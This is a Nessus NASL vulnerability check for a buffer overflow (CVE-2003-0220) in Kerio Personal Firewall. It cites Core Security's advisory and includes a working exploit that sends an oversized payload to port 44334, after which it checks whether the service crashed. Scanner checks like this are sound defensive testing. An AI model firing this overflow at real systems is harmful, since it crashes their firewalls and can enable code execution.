# This script was written by Michel Arboi <arboi@alussinan.org>
# Exploit string by Core Security Technologies
#
# GNU Public Licence
#
# References:
# Date: Mon, 28 Apr 2003 15:34:27 -0300
# From: "CORE Security Technologies Advisories" <advisories@coresecurity.com>
# To: "Bugtraq" <bugtraq@securityfocus.com>, "Vulnwatch" <vulnwatch@vulnwatch.org>
# Subject: CORE-2003-0305-02: Vulnerabilities in Kerio Personal Firewall
#
# From: SecuriTeam <support@securiteam.com>
# Subject: [EXPL] Vulnerabilities in Kerio Personal Firewall (Exploit)
# To: list@securiteam.com
# Date: 18 May 2003 21:03:11 +0200
#
# Changes by rd : uncommented the recv() calls and tested it.
#
# 

if (description)
{
  script_id(11575);
  script_cve_id("CVE-2003-0220");
  script_bugtraq_id(7180);
  script_version ("$Revision: 1.6 $");
 
 name["english"] = "Kerio personal Firewall buffer overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
Kerio Personal Firewall is vulnerable to a buffer overflow
on the administration port.
A cracker may use this to crash Kerio or worse, execute arbitrary
code on the system.

Risk factor : High
Solution : Upgrade your personal firewall";

  script_description(english:desc["english"]);
 
  summary["english"] = "Buffer overflow on KPF administration port";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK); 
  script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
  family["english"] = "Firewalls";
  script_family(english:family["english"]);
  #script_dependencie("find_service.nes");
  script_require_ports("Services/kerio", 44334);
  exit(0);
}


port = 44334;		# Default port
if (! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);

b = recv(socket: soc, length: 10);
b = recv(socket: soc, length: 256);
expl = raw_string(0x00, 0x00, 0x14, 0x9C);
expl += crap(0x149c);
send(socket: soc, data: expl);
close(soc);

soc = open_sock_tcp(port);
if (! soc) security_hole(port);
